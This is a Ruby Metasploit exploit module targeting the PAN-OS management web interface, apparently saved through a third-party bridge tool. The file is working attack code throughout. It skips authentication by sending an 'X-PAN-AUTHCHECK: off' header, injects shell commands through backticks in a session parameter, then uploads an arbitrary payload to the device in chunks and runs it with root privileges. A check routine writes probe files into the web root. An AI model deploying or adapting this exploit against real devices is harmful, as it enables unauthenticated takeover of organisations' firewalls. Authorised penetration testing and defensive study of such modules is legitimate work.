##
# Metasploit Module — saved locally via SuiteXPL MSF Bridge
# Source: https://github.com/rapid7/metasploit-framework
# Bridge: embedxpl.core.bridges.exploit_bridge.run_via_msfconsole("panos_management_unauth_rce")
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Palo Alto Networks PAN-OS Management Interface Unauthenticated Remote Code Execution',
        'Description' => %q{
          This module exploits an authentication bypass vulnerability (CVE-2024-0012) and a command injection
          vulnerability (CVE-2024-9474) in the PAN-OS management web interface. An unauthenticated attacker can
          execute arbitrary code with root privileges.

          Affected: PAN-OS 10.2 <= 10.2.12-h2, 11.0 <= 11.0.6-h1, 11.1 <= 11.1.5-h1, 11.2 <= 11.2.4-h1
        },
        'License' => MSF_LICENSE,
        'Author' => ['watchTowr', 'sfewer-r7'],
        'References' => [
          ['CVE', '2024-0012'],
          ['CVE', '2024-9474'],
          ['URL', 'https://security.paloaltonetworks.com/CVE-2024-0012'],
          ['URL', 'https://security.paloaltonetworks.com/CVE-2024-9474'],
          ['URL', 'https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/']
        ],
        'DisclosureDate' => '2024-11-18',
        'Platform' => ['linux', 'unix'],
        'Arch' => [ARCH_CMD],
        'Privileged' => true,
        'Targets' => [['Default', {'Payload' => {'Space' => 5670, 'DisableNops' => true, 'BadChars' => '\\\'"&'}}]],
        'DefaultOptions' => {'RPORT' => 443, 'SSL' => true, 'FETCH_WRITABLE_DIR' => '/var/tmp'},
        'DefaultTarget' => 0,
        'Notes' => {'Stability' => [CRASH_SAFE], 'Reliability' => [REPEATABLE_SESSION], 'SideEffects' => [IOC_IN_LOGS]}
      )
    )
    register_options([OptString.new('WRITABLE_DIR', [true, 'Writable dir on target', '/var/tmp'])])
  end

  def check
    check_file_name = Rex::Text.rand_text_alphanumeric(4)
    return CheckCode::Safe unless execute_cmd("echo #{check_file_name} > /var/appweb/htdocs/unauth/#{check_file_name}", dontfail: true)
    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri('unauth', check_file_name))
    return CheckCode::Unknown unless res
    if res.code == 200 && res.body.include?(check_file_name)
      execute_cmd("rm -f /var/appweb/htdocs/unauth/#{check_file_name}", dontfail: true)
      return Exploit::CheckCode::Vulnerable
    end
    CheckCode::Safe
  end

  def exploit
    tmp_file_name = Rex::Text.rand_text_alphanumeric(4)
    bootstrap_payload = "rm -f #{datastore['WRITABLE_DIR']}/#{tmp_file_name}*;#{payload.encoded}"
    idx = 1; idx_prefix = ''
    chunk_size = 63 - 2 - "echo -n ''>#{datastore['WRITABLE_DIR']}/#{tmp_file_name}#{idx_prefix}#{idx}".length
    curr_chunk_number = 1
    max_chunk_number = (bootstrap_payload.length / chunk_size) + 1
    while bootstrap_payload && !bootstrap_payload.empty?
      print_status("Uploading payload chunk #{curr_chunk_number} of #{max_chunk_number}...")
      chunk = bootstrap_payload[0, chunk_size]
      bootstrap_payload = bootstrap_payload[chunk_size..]
      execute_cmd("echo -n '#{chunk}'>#{datastore['WRITABLE_DIR']}/#{tmp_file_name}#{idx_prefix}#{idx}")
      idx += 1
      if idx > 9; idx = 1; idx_prefix += '9'; chunk_size -= 1; fail_with(Failure::BadConfig, 'No space') if chunk_size.zero?; end
      curr_chunk_number += 1
    end
    print_status('Amalgamating payload chunks...')
    execute_cmd("cat #{datastore['WRITABLE_DIR']}/#{tmp_file_name}* > #{datastore['WRITABLE_DIR']}/#{tmp_file_name}")
    print_status('Executing payload...')
    execute_cmd("cat #{datastore['WRITABLE_DIR']}/#{tmp_file_name}|sh", dontfail: true)
  end

  def execute_cmd(cmd, dontfail: false)
    user = "`#{cmd}`"
    fail_with(Failure::BadConfig, 'Command too long') if user.length >= 64
    res1 = send_request_cgi('method' => 'POST',
      'uri' => normalize_uri('php', 'utils', 'createRemoteAppwebSession.php', "#{Rex::Text.rand_text_alphanumeric(8)}.js.map"),
      'headers' => {'X-PAN-AUTHCHECK' => 'off'}, 'keep_cookies' => true,
      'vars_post' => {'user' => user, 'userRole' => 'superuser', 'remoteHost' => '', 'vsys' => 'vsys1'})
    unless res1&.code == 200; return false if dontfail; fail_with(Failure::UnexpectedReply, 'Auth check failed'); end
    unless cookie_jar.cookies.find { |c| c.name == 'PHPSESSID' }; fail_with(Failure::UnexpectedReply, 'No PHPSESSID'); end
    res2 = send_request_cgi('method' => 'GET', 'uri' => normalize_uri('index.php', '.js.map'), 'keep_cookies' => true)
    unless res2&.code == 200; return false if dontfail; fail_with(Failure::UnexpectedReply, 'RCE trigger failed'); end
    true
  end
end
